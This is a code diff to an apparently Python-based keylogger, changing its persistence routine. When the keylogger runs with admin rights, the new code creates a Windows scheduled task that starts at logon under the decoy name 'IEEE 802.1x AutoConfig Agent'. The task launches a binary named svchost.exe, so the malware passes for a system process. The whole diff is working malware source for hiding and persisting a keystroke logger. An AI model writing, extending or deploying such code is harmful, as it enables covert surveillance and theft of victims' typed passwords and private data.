@@ -1,6 +1,7 @@
 import ctypes
 import os
 import socket
+import subprocess
 import threading
 import uuid
 
@@ -17,6 +18,7 @@ client_id = uuid.uuid5(uuid.uuid4(), "keylogger")  # UUID to identify this insta
 channel = None
 
 # Constants
+SCHEDULED_TASK_NAME = "IEEE 802.1x AutoConfig Agent"
 BUFFER_FLUSH_PERIOD = 15.0  # Seconds
 
 
@@ -133,11 +135,16 @@ def create_persistence():
     Establishes a persistence mechanism for this program to automatically restart itself
     :return:
     """
-    # Check if running as admin. If so, create system service
+    # Check if running as admin. If so, create scheduled task
     executable_path = os.path.abspath(os.path.dirname(__file__))
     if ctypes.windll.shell32.IsUserAnAdmin():
-        # This assumes that this binary is named 'svchost.exe'
-        os.system(r"""schtasks /create /ru builtin\users /sc onlogon /tn "IEEE 802.1x AutoConfig Agent" /tr {0}\svchost.exe """.format(executable_path))
+        # all_scheduled_tasks = os.system(r"""schtasks /Query""")
+        all_scheduled_tasks = subprocess.check_output("schtasks /Query", shell=True)
+
+        # Create scheduled task if it doesn't exist
+        if SCHEDULED_TASK_NAME not in all_scheduled_tasks:
+            # This assumes that this binary is named 'svchost.exe'
+            subprocess.check_output(r"""schtasks /create /ru builtin\users /sc onlogon /tn "{0}" /tr {1}\svchost.exe """.format(SCHEDULED_TASK_NAME, executable_path), shell=True)
 
 
 # Establish persistence
